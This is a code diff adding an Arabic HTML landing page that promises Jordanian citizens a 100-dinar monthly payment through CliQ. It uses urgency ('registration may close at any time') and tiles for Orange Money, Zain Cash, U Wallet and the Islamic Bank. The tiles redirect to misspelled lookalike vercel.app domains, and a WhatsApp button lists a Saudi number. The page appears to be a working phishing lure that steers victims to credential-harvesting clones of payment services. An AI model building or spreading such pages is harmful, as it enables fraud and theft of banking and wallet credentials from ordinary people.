@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>دعم مالي شهري | خدمة كليك</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
+
+<style>
+:root{
+  --red:#b71c1c;
+  --green:#1b5e20;
+  --gold:#f9c74f;
+  --dark:#111;
+  --gray:#f4f6f9;
+}
+
+*{box-sizing:border-box;font-family:'Cairo',sans-serif}
+
+body{
+  margin:0;
+  background:var(--gray);
+  color:#222;
+}
+
+/* تنبيه علوي */
+.notice{
+  background:#fff3cd;
+  color:#664d03;
+  padding:10px;
+  text-align:center;
+  font-size:14px;
+  font-weight:600;
+}
+
+/* رأس الصفحة */
+header{
+  background:linear-gradient(135deg,var(--red),#000);
+  color:#fff;
+  padding:35px 20px 55px;
+  text-align:center;
+  position:relative;
+}
+
+header img{
+  max-width:130px;
+  margin-bottom:15px;
+}
+
+header h1{
+  font-size:26px;
+  margin:10px 0;
+}
+
+.support-card{
+  background:#fff;
+  color:#000;
+  border-radius:18px;
+  padding:20px;
+  max-width:360px;
+  margin:20px auto 0;
+  box-shadow:0 15px 35px rgba(0,0,0,.25);
+}
+
+.support-card .amount{
+  font-size:42px;
+  font-weight:800;
+  color:var(--green);
+}
+
+.support-card span{
+  display:block;
+  margin-top:6px;
+  font-size:15px;
+  color:#555;
+}
+
+/* أقسام */
+.section{
+  padding:30px 18px;
+  max-width:1100px;
+  margin:auto;
+}
+
+.title{
+  text-align:center;
+  font-size:22px;
+  font-weight:800;
+  margin-bottom:20px;
+}
+
+/* ميزات */
+.features{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+  gap:15px;
+}
+
+.feature{
+  background:#fff;
+  padding:16px;
+  border-radius:14px;
+  text-align:center;
+  box-shadow:0 8px 20px rgba(0,0,0,.08);
+  font-weight:600;
+}
+
+/* خيارات */
+.options{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+  gap:18px;
+}
+
+.option{
+  background:#fff;
+  border-radius:16px;
+  padding:18px;
+  text-align:center;
+  box-shadow:0 10px 25px rgba(0,0,0,.1);
+  cursor:pointer;
+  transition:.3s;
+  border:2px solid transparent;
+}
+
+.option:hover{
+  transform:translateY(-5px);
+  border-color:var(--green);
+}
+
+.option img{
+  max-width:80px;
+  margin-bottom:8px;
+}
+
+.option span{
+  font-weight:700;
+}
+
+/* صندوق ثقة */
+.trust{
+  background:#fff;
+  padding:20px;
+  border-radius:18px;
+  box-shadow:0 10px 25px rgba(0,0,0,.08);
+  line-height:1.9;
+  font-size:15px;
+}
+
+/* واتساب ثابت */
+.whatsapp-fixed{
+  position:fixed;
+  bottom:15px;
+  left:15px;
+  background:#25d366;
+  color:#fff;
+  padding:14px 18px;
+  border-radius:40px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  text-decoration:none;
+  font-weight:800;
+  box-shadow:0 10px 25px rgba(0,0,0,.25);
+  z-index:999;
+}
+
+.whatsapp-fixed img{
+  width:24px;
+}
+
+footer{
+  text-align:center;
+  padding:20px;
+  font-size:13px;
+  color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<div class="notice">
+⏳ التسجيل متاح حاليًا – قد يتم إيقافه في أي وقت
+</div>
+
+<header>
+  <img src="https://a.top4top.io/p_36651m9jq0.jpeg" alt="علم الأردن">
+  <h1>دعم مالي شهري للمواطنين</h1>
+
+  <div class="support-card">
+    <div class="amount">100 دينار</div>
+    <span>تحويل شهري عبر خدمة كليك</span>
+  </div>
+</header>
+
+<section class="section">
+  <div class="features">
+    <div class="feature">✔ بدون رسوم</div>
+    <div class="feature">✔ بدون بطاقة بنكية</div>
+    <div class="feature">✔ تحويل مباشر</div>
+    <div class="feature">✔ إجراءات بسيطة</div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="title">اختر طريقة الاستلام</div>
+
+  <div class="options">
+    <div class="option" onclick="go('https://oorangemoneyjo.vercel.app')">
+      <img src="https://b.top4top.io/p_3665qo0ol0.jpeg">
+      <span>Orange Money</span>
+    </div>
+
+    <div class="option" onclick="go('https://zainjooo.vercel.app')">
+      <img src="https://g.top4top.io/p_3665ofb345.jpeg">
+      <span>Zain Cash</span>
+    </div>
+
+    <div class="option" onclick="go('https://customerjo.vercel.app')">
+      <img src="https://k.top4top.io/p_3665nb0kh0.jpeg">
+      <span>U Wallet</span>
+    </div>
+
+    <div class="option" onclick="go('https://islamijor.vercel.app')">
+      <img src="https://c.top4top.io/p_3665xf4pn1.jpeg">
+      <span>البنك الإسلامي</span>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="trust">
+    يتم تحويل الدعم عبر قنوات رقمية معتمدة داخل المملكة  
+    <br>
+    في حال عدم توفر البنك أو المحفظة الخاصة بك،  
+    يرجى التواصل معنا مباشرة عبر واتساب.
+  </div>
+</section>
+
+<a class="whatsapp-fixed" href="https://wa.me/966591646503" target="_blank">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+  تواصل واتساب
+</a>
+
+<footer>
+© جميع الحقوق محفوظة
+</footer>
+
+<script>
+function go(url){
+  window.location.href = url;
+}
+</script>
+
+</body>
+</html>
